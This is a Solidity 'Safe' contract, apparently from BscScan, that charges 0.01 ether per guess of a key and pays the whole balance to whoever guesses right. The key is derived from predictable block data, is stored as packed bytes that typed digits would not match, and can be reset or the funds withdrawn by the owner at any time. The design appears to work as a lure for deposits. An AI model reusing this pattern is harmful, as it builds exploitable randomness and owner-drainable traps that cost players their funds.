/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT
contract Safe {
    address private owner;
    string private openSafeKey;

    mapping(address => bool) private unlockedWallets;
    mapping(address => uint256) private lastOpenSafeTimestamps;

    constructor() {
        owner = msg.sender;
    }

    event InvalidKeyAttempt(address indexed _sender);

function openSafe(string memory _key) public payable {
    require(msg.value == 0.01 ether, "0.01 ether required to open safe");
    uint256 lastTimestamp = lastOpenSafeTimestamps[msg.sender];
    require(block.timestamp - lastTimestamp >= 120, "Wait 2 minute");

    if (keccak256(bytes(_key)) != keccak256(bytes(openSafeKey))) {
        emit InvalidKeyAttempt(msg.sender);
        lastOpenSafeTimestamps[msg.sender] = block.timestamp;
    } else {
        unlockedWallets[msg.sender] = true;
        lastOpenSafeTimestamps[msg.sender] = block.timestamp;
        }
    }



    function claim() public {
        require(unlockedWallets[msg.sender], "Wallet is not unlocked");
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
        unlockedWallets[msg.sender] = false;
        delete unlockedWallets[msg.sender];
        delete lastOpenSafeTimestamps[msg.sender];
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function setOpenSafeKey() public {
    require(msg.sender == owner, "Only owner can change openSafeKey");
    uint256 randomNumber = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));
    uint256 randomNum = randomNumber % 10;
    openSafeKey = string(abi.encodePacked(randomNum));
    }

    function getOpenSafeKey() public view returns (string memory) {
    return openSafeKey;
    }

    receive() external payable {

        }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(msg.sender).transfer(address(this).balance);
    }
}